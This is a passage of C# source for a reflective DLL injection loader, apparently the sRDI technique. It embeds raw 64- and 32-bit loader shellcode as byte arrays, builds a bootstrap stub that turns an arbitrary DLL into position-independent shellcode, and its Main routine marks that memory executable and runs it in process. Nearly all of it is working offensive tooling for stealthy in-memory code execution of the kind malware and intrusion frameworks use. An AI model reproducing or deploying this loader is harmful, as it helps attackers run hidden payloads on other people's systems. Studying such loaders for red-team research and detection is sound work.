0xbe, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x2b, 0x4d, 0x30, 0x83, 0xbd, 0xb4, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x76, 0xff, 0x0f, 0x84, 0x94, 0x00, 0x00, 0x00, 0x8b, 0x95, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x03, 0xd7, 0x8b, 0x42, 0x04, 0x85, 0xc0, 0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, 0xbb, 0xff, 0x0f, 0x00, 0x00, 0x44, 0x8b, 0x02, 0x44, 0x8b, 0xd0, 0x4c, 0x8d, 0x5a, 0x08, 0x49, 0x83, 0xea, 0x08, 0x4c, 0x03, 0xc7, 0x49, 0xd1, 0xea, 0x74, 0x58, 0x41, 0x0f, 0xb7, 0x0b, 0x4c, 0x2b, 0xd6, 0x0f, 0xb7, 0xc1, 0x66, 0xc1, 0xe8, 0x0c, 0x66, 0x83, 0xf8, 0x0a, 0x75, 0x09, 0x48, 0x23, 0xcb, 0x4e, 0x01, 0x0c, 0x01, 0xeb, 0x33, 0x66, 0x83, 0xf8, 0x03, 0x75, 0x09, 0x48, 0x23, 0xcb, 0x46, 0x01, 0x0c, 0x01, 0xeb, 0x24, 0x66, 0x3b, 0xc6, 0x75, 0x11, 0x49, 0x8b, 0xc1, 0x48, 0x23, 0xcb, 0x48, 0xc1, 0xe8, 0x10, 0x66, 0x42, 0x01, 0x04, 0x01, 0xeb, 0x0e, 0x66, 0x41, 0x3b, 0xc6, 0x75, 0x08, 0x48, 0x23, 0xcb, 0x66, 0x46, 0x01, 0x0c, 0x01, 0x4d, 0x03, 0xde, 0x4d, 0x85, 0xd2, 0x75, 0xa8, 0x8b, 0x42, 0x04, 0x48, 0x03, 0xd0, 0x8b, 0x42, 0x04, 0x85, 0xc0, 0x75, 0x85, 0x8b, 0x5d, 0x28, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x83, 0xc9, 0xff, 0x48, 0x03, 0xdf, 0x41, 0xff, 0xd5, 0x4c, 0x8b, 0xc6, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xff, 0xd3, 0x45, 0x85, 0xe4, 0x0f, 0x84, 0x99, 0x00, 0x00, 0x00, 0x83, 0xbd, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, 0x8b, 0x95, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xd7, 0x44, 0x8b, 0x5a, 0x18, 0x45, 0x85, 0xdb, 0x74, 0x7a, 0x83, 0x7a, 0x14, 0x00, 0x74, 0x74, 0x44, 0x8b, 0x52, 0x20, 0x44, 0x8b, 0x42, 0x24, 0x33, 0xdb, 0x4c, 0x03, 0xd7, 0x4c, 0x03, 0xc7, 0x45, 0x85, 0xdb, 0x74, 0x5f, 0x45, 0x8b, 0x0a, 0x4c, 0x03, 0xcf, 0x33, 0xc9, 0x41, 0x0f, 0xbe, 0x01, 0xc1, 0xc9, 0x0d, 0x4c, 0x03, 0xce, 0x03, 0xc8, 0x41, 0x80, 0x79, 0xff, 0x00, 0x75, 0xed, 0x44, 0x3b, 0xe1, 0x74, 0x10, 0x03, 0xde, 0x49, 0x83, 0xc2, 0x04, 0x4d, 0x03, 0xc6, 0x41, 0x3b, 0xdb, 0x72, 0xd2, 0xeb, 0x2f, 0x41, 0x0f, 0xb7, 0x00, 0x83, 0xf8, 0xff, 0x74, 0x26, 0x8b, 0x52, 0x1c, 0xc1, 0xe0, 0x02, 0x48, 0x63, 0xc8, 0x48, 0x8d, 0x04, 0x0f, 0x48, 0x8b, 0x8c, 0x24, 0x80, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x04, 0x02, 0x8b, 0x94, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x03, 0xc7, 0x41, 0xff, 0xd0, 0x48, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x28, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xdf, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };
            var rdiShellcode32 = new byte[] { 0x55, 0x8b, 0xec, 0x83, 0xec, 0x18, 0x53, 0x56, 0x57, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xe8, 0x44, 0x02, 0x00, 0x00, 0x89, 0x45, 0xf4, 0xc7, 0x04, 0x24, 0x49, 0xf7, 0x02, 0x78, 0xe8, 0x35, 0x02, 0x00, 0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0x89, 0x45, 0xec, 0xe8, 0x28, 0x02, 0x00, 0x00, 0x68, 0xaf, 0xb1, 0x5c, 0x94, 0x8b, 0xf8, 0xe8, 0x1c, 0x02, 0x00, 0x00, 0x8b, 0x5d, 0x08, 0x8b, 0x73, 0x3c, 0x83, 0xc4, 0x0c, 0x6a, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x03, 0xf3, 0xff, 0x76, 0x50, 0x89, 0x45, 0xe8, 0x6a, 0x00, 0xff, 0xd7, 0x8b, 0xc8, 0x8b, 0x46, 0x54, 0x89, 0x4d, 0xfc, 0x8b, 0xfb, 0x85, 0xc0, 0x74, 0x0b, 0x2b, 0xcb, 0x8a, 0x17, 0x88, 0x14, 0x39, 0x47, 0x48, 0x75, 0xf7, 0x0f, 0xb7, 0x46, 0x14, 0x8d, 0x7c, 0x30, 0x2c, 0x0f, 0xb7, 0x46, 0x06, 0x89, 0x45, 0x08, 0x85, 0xc0, 0x74, 0x2f, 0x8b, 0x47, 0xf8, 0x8b, 0x0f, 0x8b, 0x57, 0xfc, 0xff, 0x4d, 0x08, 0x03, 0x45, 0xfc, 0x03, 0xcb, 0x89, 0x55, 0xf8, 0x85, 0xd2, 0x74, 0x0f, 0x8a, 0x11, 0xff, 0x4d, 0xf8, 0x88, 0x10, 0x40, 0x41, 0x83, 0x7d, 0xf8, 0x00, 0x75, 0xf1, 0x83, 0xc7, 0x28, 0x83, 0x7d, 0x08, 0x00, 0x75, 0xd1, 0x8b, 0x9e, 0x80, 0x00, 0x00, 0x00, 0x03, 0x5d, 0xfc, 0xeb, 0x6a, 0x03, 0x45, 0xfc, 0x50, 0xff, 0x55, 0xf4, 0x8b, 0x0b, 0x8b, 0x7b, 0x10, 0x03, 0x4d, 0xfc, 0x03, 0x7d, 0xfc, 0x89, 0x45, 0x08, 0xeb, 0x48, 0x8b, 0x11, 0x85, 0xd2, 0x74, 0x27, 0x79, 0x25, 0x8b, 0x50, 0x3c, 0x8b, 0x54, 0x02, 0x78, 0x03, 0xd0, 0x8b, 0x01, 0x25, 0xff, 0xff, 0x00, 0x00, 0x2b, 0x42, 0x10, 0x8b, 0x52, 0x1c, 0x8d, 0x14, 0x82, 0x8b, 0x45, 0x08, 0x8b, 0x14, 0x02, 0x03, 0xd0, 0x89, 0x17, 0xeb, 0x15, 0x8b, 0x0f, 0x03, 0x4d, 0xfc, 0x83, 0xc1, 0x02, 0x51, 0x50, 0xff, 0x55, 0xec, 0x8b, 0x4d, 0xf8, 0x89, 0x07, 0x8b, 0x45, 0x08, 0x83, 0xc7, 0x04, 0x83, 0xc1, 0x04, 0x83, 0x3f, 0x00, 0x89, 0x4d, 0xf8, 0x75, 0xb0, 0x83, 0xc3, 0x14, 0x8b, 0x43, 0x0c, 0x85, 0xc0, 0x75, 0x8f, 0x8b, 0x5d, 0xfc, 0x2b, 0x5e, 0x34, 0x39, 0x86, 0xa4, 0x00, 0x00, 0x00, 0x74, 0x7e, 0x8b, 0x96, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x55, 0xfc, 0xeb, 0x6c, 0x8b, 0x0a, 0x03, 0x4d, 0xfc, 0x83, 0xc0, 0xf8, 0xd1, 0xe8, 0x8d, 0x7a, 0x08, 0x89, 0x7d, 0xf8, 0x74, 0x57, 0x48, 0x89, 0x45, 0x08, 0x8b, 0x45, 0xf8, 0x0f, 0xb7, 0x00, 0x66, 0x8b, 0xf8, 0x66, 0xc1, 0xef, 0x0c, 0x66, 0x83, 0xff, 0x0a, 0x74, 0x06, 0x66, 0x83, 0xff, 0x03, 0x75, 0x0a, 0x25, 0xff, 0x0f, 0x00, 0x00, 0x01, 0x1c, 0x08, 0xeb, 0x25, 0x66, 0x83, 0xff, 0x01, 0x75, 0x10, 0x8b, 0xfb, 0x25, 0xff, 0x0f, 0x00, 0x00, 0xc1, 0xef, 0x10, 0x66, 0x01, 0x3c, 0x08, 0xeb, 0x0f, 0x66, 0x83, 0xff, 0x02, 0x75, 0x09, 0x25, 0xff, 0x0f, 0x00, 0x00, 0x66, 0x01, 0x1c, 0x08, 0x8b, 0x45, 0x08, 0x83, 0x45, 0xf8, 0x02, 0x85, 0xc0, 0x75, 0xa9, 0x03, 0x52, 0x04, 0x8b, 0x42, 0x04, 0x85, 0xc0, 0x75, 0x8d, 0x8b, 0x5e, 0x28, 0x03, 0x5d, 0xfc, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0xff, 0xff, 0x55, 0xe8, 0x8b, 0x7d, 0xfc, 0x6a, 0x01, 0x6a, 0x01, 0x57, 0xff, 0xd3, 0x33, 0xdb, 0x39, 0x5d, 0x0c, 0x74, 0x75, 0x39, 0x5e, 0x7c, 0x74, 0x70, 0x8b, 0x76, 0x78, 0x03, 0xf7, 0x8b, 0x56, 0x18, 0x3b, 0xd3, 0x74, 0x64, 0x39, 0x5e, 0x14, 0x74, 0x5f, 0x8b, 0x46, 0x20, 0x8b, 0x4e, 0x24, 0x03, 0xc7, 0x03, 0xcf, 0x89, 0x5d, 0x08, 0x3b, 0xd3, 0x76, 0x4e, 0x8b, 0x10, 0x03, 0x55, 0xfc, 0x33, 0xff, 0x0f, 0xbe, 0x1a, 0xc1, 0xcf, 0x0d, 0x03, 0xfb, 0x42, 0x80, 0x7a, 0xff, 0x00, 0x75, 0xf1, 0x39, 0x7d, 0x0c, 0x74, 0x13, 0xff, 0x45, 0x08, 0x8b, 0x55, 0x08, 0x83, 0xc0, 0x04, 0x83, 0xc1, 0x02, 0x3b, 0x56, 0x18, 0x72, 0xd4, 0xeb, 0x20, 0x0f, 0xb7, 0x01, 0x83, 0xf8, 0xff, 0x74, 0x18, 0x8b, 0x4e, 0x1c, 0xff, 0x75, 0x14, 0x8d, 0x0c, 0x81, 0x8b, 0x45, 0xfc, 0x8b, 0x0c, 0x01, 0xff, 0x75, 0x10, 0x03, 0xc8, 0xff, 0xd1, 0x59, 0x59, 0x8b, 0x45, 0xfc, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x55, 0x8b, 0xec, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x0c, 0x83, 0xec, 0x14, 0x53, 0x56, 0x57, 0xe9, 0x9f, 0x00, 0x00, 0x00, 0x8b, 0x71, 0x3c, 0x8b, 0x50, 0x2c, 0x8b, 0x74, 0x0e, 0x78, 0x83, 0x65, 0xf8, 0x00, 0x8b, 0x78, 0x30, 0x8b, 0x00, 0x89, 0x55, 0xec, 0x85, 0xf6, 0x0f, 0x84, 0x81, 0x00, 0x00, 0x00, 0x83, 0x65, 0xfc, 0x00, 0xc1, 0xea, 0x10, 0x33, 0xdb, 0x66, 0x3b, 0xda, 0x73, 0x2d, 0x8b, 0x55, 0xfc, 0x8a, 0x14, 0x17, 0xc1, 0x4d, 0xf8, 0x0d, 0x80, 0xfa, 0x61, 0x0f, 0xbe, 0xd2, 0x7c, 0x0c, 0x8b, 0x5d, 0xf8, 0x8d, 0x54, 0x13, 0xe0, 0x89, 0x55, 0xf8, 0xeb, 0x03, 0x01, 0x55, 0xf8, 0x0f, 0xb7, 0x55, 0xee, 0xff, 0x45, 0xfc, 0x39, 0x55, 0xfc, 0x72, 0xd3, 0x83, 0x65, 0xfc, 0x00, 0x03, 0xf1, 0x8b, 0x56, 0x20, 0x8b, 0x7e, 0x18, 0x03, 0xd1, 0x85, 0xff, 0x74, 0x34, 0x8b, 0x3a, 0x03, 0xf9, 0x33, 0xdb, 0x83, 0xc2, 0x04, 0x89, 0x7d, 0xf4, 0x0f, 0xbe, 0x3f, 0xc1, 0xcb, 0x0d, 0x03, 0xdf, 0x8b, 0x7d, 0xf4, 0x47, 0x80, 0x7f, 0xff, 0x00, 0x89, 0x7d, 0xf4, 0x75, 0xeb, 0x03, 0x5d, 0xf8, 0x3b, 0x5d, 0x08, 0x74, 0x1d, 0xff, 0x45, 0xfc, 0x8b, 0x7d, 0xfc, 0x3b, 0x7e, 0x18, 0x72, 0xcc, 0x8b, 0x48, 0x18, 0x85, 0xc9, 0x0f, 0x85, 0x56, 0xff, 0xff, 0xff, 0x33, 0xc0, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0x55, 0xfc, 0x8b, 0x46, 0x24, 0x8d, 0x04, 0x50, 0x0f, 0xb7, 0x04, 0x08, 0x8b, 0x56, 0x1c, 0x8d, 0x04, 0x82, 0x8b, 0x04, 0x08, 0x03, 0xc1, 0xeb, 0xe1 };
#endif
            var newShellcode = new List<byte>();

            if (PE.Is64BitDLL(dllBytes))
            {
                var rdiShellcode = rdiShellcode64;
                int bootstrapSize = 34;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                //Here is where the we pop the address of our shellcode off the stack and into the first register
                // pop rcx
                newShellcode.Add(0x59);

                // mov r8, rcx - Backup our memory location to RCX before we start subtracting
                newShellcode.Add(0x49);
                newShellcode.Add(0x89);
                newShellcode.Add(0xc8);

                // Put the location of the DLL into RCX
                // add rcx, <Length of bootstrap> - 5 (For our call instruction) + <rdiShellcode Length>
                newShellcode.Add(0x48);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc1);

                foreach (byte b in BitConverter.GetBytes((uint)(bootstrapSize - 5 + rdiShellcode.Length)))
                    newShellcode.Add(b);

                // mov edx, <hash of function>
                newShellcode.Add(0xba);
                foreach (byte b in BitConverter.GetBytes((uint)functionHash))
                    newShellcode.Add(b);

                // Put the location of our user data in 
                // add r8, (Size of bootstrap) + <Length of RDI Shellcode> + <Length of DLL>
                newShellcode.Add(0x49);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc0);

                foreach (byte b in BitConverter.GetBytes((uint)(bootstrapSize - 5 + rdiShellcode.Length + dllBytes.Length)))
                    newShellcode.Add(b);

                // mov r9d, <Length of User Data>
                newShellcode.Add(0x41);
                newShellcode.Add(0xb9);

                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                //Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                //Write our DLL
                dllBytes[0] = 0x00;
                dllBytes[1] = 0x00;
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                //Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);

            }
            else // 32 Bit
            {
                var rdiShellcode = rdiShellcode32;
                int bootstrapSize = 40;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                //Here is where the we pop the address of our shellcode off the stack and into the first register
                // pop ecx
                newShellcode.Add(0x58);

                // mov ebx, eax - copy our location in memory to ebx before we start modifying eax
                newShellcode.Add(0x89);
                newShellcode.Add(0xc3);

                // Put the location of the DLL into ECX
                // add eax, <size of bootstrap> + <Size of RDI Shellcode>
                newShellcode.Add(0x05);
                foreach (byte b in BitConverter.GetBytes((uint)(bootstrapSize - 5 + rdiShellcode.Length)))
                    newShellcode.Add(b);

                // add ebx, <size of bootstrap> + <Size of RDI Shellcode> + <Size of DLL>
                newShellcode.Add(0x81);
                newShellcode.Add(0xc3);

                foreach (byte b in BitConverter.GetBytes((uint)(bootstrapSize - 5 + rdiShellcode.Length + dllBytes.Length)))
                    newShellcode.Add(b);

                //push <Length of User Data>
                newShellcode.Add(0x68);

                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                // push ebx
                newShellcode.Add(0x53);

                // push <hash of function>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes((uint)functionHash))
                    newShellcode.Add(b);

                // push eax
                newShellcode.Add(0x50);

                // call instruction - We need to transfer execution to the RDI assembly this way (Skip over our next few op codes)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x04);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // add esp, 0x10 - RDI pushes things to the stack it never removes, we need to make the correction ourselves
                newShellcode.Add(0x83);
                newShellcode.Add(0xc4);
                newShellcode.Add(0x10);

                // ret - because we used call earlier
                newShellcode.Add(0xc3);

                //Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                //Write our DLL
                dllBytes[0] = 0x00;
                dllBytes[1] = 0x00;
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                //Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);
            }
            
            return newShellcode.ToArray();
        }

        static void Main(string[] args)
        {
            byte[] data = null;
            byte[] userData = System.Text.Encoding.Default.GetBytes("None\0");

            if (args.Length < 1)
            {
                Console.WriteLine("\n[!] Usage:\n\n\tDotNetLoader.exe <DLL File>\n\tDotNetLoader.exe <Shellcode Bin>");
                return;
            }

            try
            {
                data = System.IO.File.ReadAllBytes(args[0]);
            }
            catch
            {
                Console.WriteLine("\n[!] Failed to load file");
                Environment.Exit(0);
            }

            byte[] shellcode;

            if (data[0] == 'M' && data[1] == 'Z')
            {
                // 0x30627745 - 'SayHello' - FunctionToHash.py
                shellcode = ConvertToShellcode(data, 0x30627745, userData);

                Console.WriteLine("[+] Converted DLL to shellcode");
            }
            else shellcode = data;

            GCHandle scHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();

            if(!Native.VirtualProtect(scPointer, (UIntPtr)shellcode.Length, Native.PAGE_EXECUTE_READWRITE, out uint flOldProtect))
            {
                Console.WriteLine("[!] Failed to set memory flags");
                return;
            }

            ReflectiveLoader reflectiveLoader = (ReflectiveLoader)Marshal.GetDelegateForFunctionPointer(scPointer, typeof(ReflectiveLoader));

            Console.WriteLine("[+] Executing RDI");

            IntPtr peLocation = reflectiveLoader();

            IntPtr expFunctionLocation = PE.GetProcAddressR(peLocation, "SayGoodbye");
            if(expFunctionLocation != IntPtr.Zero)
            {
                ExportedFunction exportedFunction = (ExportedFunction)Marshal.GetDelegateForFunctionPointer(expFunctionLocation, typeof(ExportedFunction));
                GCHandle userDataHandle = GCHandle.Alloc(userData, GCHandleType.Pinned);
                IntPtr userDataPointer = userDataHandle.AddrOfPinnedObject();

                Console.WriteLine("[+] Calling exported function");

                exportedFunction(userDataPointer, (uint)userData.Length);
            }
        }
    }
}
